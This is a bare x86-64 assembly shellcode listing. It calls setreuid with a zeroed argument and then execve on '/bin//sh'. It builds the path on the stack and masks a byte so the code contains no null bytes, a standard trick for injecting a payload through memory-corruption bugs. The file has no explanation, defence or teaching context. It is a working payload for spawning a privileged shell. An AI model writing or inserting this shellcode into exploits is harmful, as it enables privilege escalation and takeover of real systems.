sys_execve equ 59
sys_setreuid equ 105

section .text

global _start

_start:

xor rax, rax
mov al, sys_setreuid
xor rdi,rdi
syscall

;/bin//sh = 2f 62 69 6e 2f 73 68 aa 

push 0x6e69622f
mov edi, 0xaa68732f
and edi, 0x55ffffff
mov dword[rsp + 4], edi; #1 filename
mov rdi, rsp

xor rsi, rsi        ;2nd argument = null
xor rdx, rdx 		;3rd arg = null

xor rax, rax
mov al, sys_execve ; execve

syscall

; mov rax, rdi        ; #1 Return value
; mov rax, sys_exit   ; exit
; syscall




